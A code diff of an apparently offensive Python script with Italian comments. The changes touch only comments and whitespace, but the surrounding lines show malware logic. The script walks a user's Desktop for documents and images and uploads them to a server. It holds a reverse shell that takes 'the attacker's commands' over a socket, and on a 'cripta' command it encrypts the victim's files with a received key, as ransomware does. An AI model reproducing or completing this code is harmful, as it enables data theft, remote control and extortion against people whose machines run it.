@@ -9,7 +9,7 @@ import pyAesCrypt
 
 
 url="http://127.0.0.1/upload.php" 
-root='C:\\Users\\Lenovo\\Desktop\\'#'C:\\Users'#impostare percorso di partenza per recupero file
+root='C:\\Users\\Lenovo\\Desktop\\'#'C:\\Users'#impostare percorso di partenza files
 
 estensioni=['.txt','.pdf', '.xls','.jpg']#aggiungere eventuali estensioni files 
 
@@ -36,7 +36,6 @@ for directory, subdirectory, files in os.walk(root):
         except FileNotFoundError:
            continue
 
-      
 
 def reverse_shell():
 
@@ -46,8 +45,7 @@ def reverse_shell():
     while True: 
         command = s.recv(1024).decode() # riceve i comandi dell'attaccante
         print(command)
-                                                                  
-        
+                                                                   
         if 'cripta' == str(command):
             key_value= str(s.recv(1024).decode())
             cripta_file(key_value)
@@ -74,7 +72,6 @@ def cripta_file(key_cifra):
                 corrispondenza=True
                 
          try:
-
              os.chdir(directory)
 
              if corrispondenza:
